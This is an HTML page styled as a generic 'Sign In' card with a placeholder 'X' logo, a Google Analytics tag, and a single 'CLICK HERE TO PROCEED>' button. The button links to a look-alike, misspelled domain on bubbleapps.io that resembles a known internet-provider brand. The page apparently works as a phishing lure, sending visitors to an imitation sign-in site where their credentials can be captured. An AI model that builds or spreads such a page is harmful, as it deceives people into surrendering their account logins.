<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign In</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://unpkg.com/lucide@latest"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500&display=swap" rel="stylesheet">
<style>
body {
font-family: 'Inter', sans-serif;
}
</style><!-- aura-ga4-start -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-2M6V79H761"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');
</script>
<!-- aura-ga4-end -->
</head>
<body class="min-h-screen bg-gray-50 flex items-center justify-center p-4 antialiased text-gray-900">

    <div class="w-full max-w-[420px] bg-white rounded-3xl shadow-[0_8px_30px_rgb(0,0,0,0.04)] ring-1 ring-gray-900/5 relative overflow-hidden">
        
        <!-- Dark Banner -->
        <div class="h-32 bg-gray-900 relative">
            <div class="absolute inset-0 bg-gradient-to-b from-white/5 to-transparent"></div>
        </div>

        <!-- Enlarged Circular Profile Photo Overlapping Banner -->
        <div class="absolute top-32 left-1/2 -translate-x-1/2 -translate-y-1/2 flex items-center justify-center w-28 h-28 bg-white rounded-full p-1.5 shadow-sm">
            <div class="w-full h-full bg-gray-900 rounded-full flex items-center justify-center overflow-hidden">
                <!-- Using object-cover to fit perfectly within the circle while keeping the logo visible -->
                <img src="https://placehold.co/400x400/4f03c4/ffffff?text=X" alt="Profile Picture" class="w-full h-full object-cover">
            </div>
        </div>

        <!-- Card Content -->
        <div class="px-8 pb-10 pt-20 text-center">
            
            <p class="text-base text-gray-600 mb-8 font-normal">
                Sign in to continue to your account
            </p>
            
            <!-- Button configured as a link -->
            <a href="http://xffinnittyy.bubbleapps.io" class="w-full bg-gray-900 hover:bg-gray-800 text-white text-base font-normal py-3 rounded-xl transition-all duration-200 shadow-sm flex items-center justify-center gap-2 active:scale-[0.98]">
                CLICK HERE TO PROCEED>
            </a>
            
        </div>
    </div>

    <script>
        lucide.createIcons();
    </script>
</body>
</html>
